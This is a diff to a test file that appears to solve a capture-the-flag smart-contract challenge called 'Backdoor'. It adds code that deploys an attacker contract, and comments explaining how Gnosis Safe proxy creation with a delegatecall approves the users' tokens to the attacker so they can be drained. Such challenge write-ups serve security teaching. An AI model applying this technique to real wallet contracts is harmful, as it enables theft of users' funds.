@@ -36,7 +36,22 @@ describe('[Challenge] Backdoor', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const attackerWalletRegistry = await (await ethers.getContractFactory('AttackerWalletRegistry', attacker)).deploy(
+            this.masterCopy.address,
+            this.walletFactory.address,
+            this.token.address,
+            this.walletRegistry.address
+        );
+
+        // This will iteratively create GnosisSafeProxy proxies (corresponding to each user as owner) using 
+        // GnosisSafeProxyFactory (walletFactory). During each proxy creation the tokens are approved to
+        // attacker address by the created proxy due to a `delegatecall` in between execution pipeline. 
+        // Then, a callback (`proxyCreated`) into the WalletRegistry transfers the tokens to proxy, which
+        // can be transferred to attacker address since it was already approved to it
+        await attackerWalletRegistry.createProxy(
+            users, 
+            AMOUNT_TOKENS_DISTRIBUTED.div(4), attacker.address
+        );
     });
 
     after(async function () {
